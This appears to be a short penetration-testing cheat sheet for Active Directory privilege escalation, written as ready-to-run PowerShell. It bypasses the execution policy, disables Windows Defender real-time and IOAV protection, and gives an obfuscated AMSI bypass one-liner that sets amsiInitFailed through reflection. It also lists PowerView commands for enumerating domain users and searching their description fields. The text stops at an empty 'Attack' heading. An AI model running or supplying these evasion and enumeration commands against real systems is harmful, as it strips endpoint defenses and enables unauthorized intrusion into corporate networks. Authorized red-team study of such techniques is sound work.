## Privilege Escalation

## Active Directory

### Setup

Bypass Execution Policy
```powershell
powershell -ep bypass
```

Turn off AMSI 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

AMSI bypass
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```


### Enumeration

#### PowerView

Get all the users
```powershell
Get-NetUser
Get-NetUser | select -ExpandProperty samaccountname
Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
Get-NetUser -Username student1
Get-UserProperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "built"
```


### Attack
